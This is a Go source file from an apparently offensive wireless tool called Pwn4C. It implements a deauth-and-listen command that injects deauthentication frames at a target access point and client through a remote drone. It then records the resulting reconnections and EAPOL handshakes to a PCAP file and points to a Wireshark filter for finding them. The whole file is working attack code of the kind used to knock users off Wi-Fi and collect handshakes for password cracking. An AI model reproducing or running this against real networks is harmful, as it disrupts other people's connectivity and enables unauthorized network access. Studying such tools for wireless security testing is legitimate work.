package cmd

import (
	"fmt"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/3lyly0/Pwn4C/internal/drone"
)

// runDeauthWithListen implements `deauth --monitor`: inject the burst, then
// keep the very same control session alive and stream everything that follows
// (probe requests, re-associations, EAPOL handshakes) into a PCAP file.
//
// This is the classic deauth-and-listen workflow in one command. It also keeps
// the radio undisturbed: no disconnect/reconnect churn around the burst.
func runDeauthWithListen(client *drone.ControlClient, frameHex string) {
	outPath := deauthOut
	if outPath == "" {
		outPath = "handshake.pcap"
	}

	destLabel := clientLabel(deauthClient)

	// The UDP stream receiver must be bound before the burst so the very
	// first probe requests after the deauth are captured.
	var frameCount uint64
	receiver, err := drone.StartStreamReceiver(drone.DefaultStreamPort, outPath, func(seq uint32, frame []byte) {
		frameCount++
		if frameCount == 1 || frameCount%50 == 0 {
			fmt.Printf("\r[+] Captured %d frames (last size: %d bytes)...", frameCount, len(frame))
		}
	})
	if err != nil {
		fmt.Printf("[!] Failed to bind UDP stream receiver: %v\n", err)
		os.Exit(1)
	}
	defer receiver.Close()

	fmt.Printf("[+] Writing PCAP dump to: %s\n", outPath)

	// Narrow the capture before the burst so the PCAP stays small and the
	// handshake frames are easy to find. The daemon's BSSID filter checks
	// Addr1/Addr2/Addr3, so EAPOL data frames survive it.
	filterApplied := false
	if deauthFilterBSSID != "" || deauthMgmtOnly {
		fmt.Printf("[+] Attaching kernel BPF filter (mgmt_only=%v, bssid=%s)...\n",
			deauthMgmtOnly, deauthFilterBSSID)
		if err := client.SetFilter(deauthMgmtOnly, deauthFilterBSSID); err != nil {
			fmt.Printf("[!] Warning: failed to attach BPF filter: %v\n", err)
		} else {
			filterApplied = true
		}
	} else {
		// Start from a known state: a filter left behind by an earlier
		// session would silently narrow this capture.
		if err := client.SetFilter(false, ""); err != nil {
			fmt.Printf("[!] Warning: failed to clear inherited BPF filter: %v\n", err)
		}
		fmt.Printf("    Tip: add --filter-bssid %s to keep the PCAP small.\n", deauthBSSID)
	}

	fmt.Printf("[+] Injecting %d deauth frames (Interval: %dms)...\n", deauthCount, deauthInterval)
	fmt.Printf("    AP (BSSID) : %s\n", deauthBSSID)
	fmt.Printf("    Client     : %s\n", destLabel)
	fmt.Printf("    Channel    : %d\n", deauthChannel)

	txBefore, txBeforeOK := readTxFrames(client)
	sent, queued, failed, err := client.SendInjection(frameHex, deauthCount, deauthInterval)
	if err != nil {
		fmt.Printf("[!] Injection failed: %v\n", err)
		if filterApplied {
			_ = client.SetFilter(false, "")
		}
		os.Exit(1)
	}

	fmt.Printf("[+] Injection queued: %d frame(s) (accepted synchronously: %d, failed: %d)\n",
		queued, sent, failed)
	if queued > 0 {
		if err := waitForTxDrain(client, 5*time.Second); err != nil {
			fmt.Printf("[!] Lost contact with the drone during TX: %v\n", err)
			fmt.Println("    It may have reset — check `pwn4c discover` and its uptime.")
			os.Exit(1)
		}
	}
	reportTxDelta(client, txBefore, txBeforeOK, sent+queued)

	fmt.Printf("\n[+] Deauth sent — listening on channel %d for reconnections and handshakes.\n", deauthChannel)
	fmt.Println("    Press Ctrl+C to stop. Open the capture with:")
	fmt.Printf("    wireshark -r %s   (filter: eapol || wlan.fc.type_subtype == 0x0c)\n", outPath)

	waitForInterrupt()

	fmt.Println("\n[*] Stopping capture session...")
	if filterApplied {
		if err := client.SetFilter(false, ""); err != nil {
			fmt.Printf("[!] Warning: failed to clear BPF filter: %v\n", err)
		}
	}
	if err := client.StopMonitor(); err != nil {
		fmt.Printf("[!] Warning: failed to stop monitor mode: %v\n", err)
	}
	_ = receiver.Close()

	fmt.Printf("[+] Capture saved: %s (%d frames)\n", outPath, frameCount)
}

// waitForInterrupt blocks until Ctrl+C / SIGTERM.
func waitForInterrupt() {
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, os.Interrupt, syscall.SIGTERM)
	<-sigCh
}
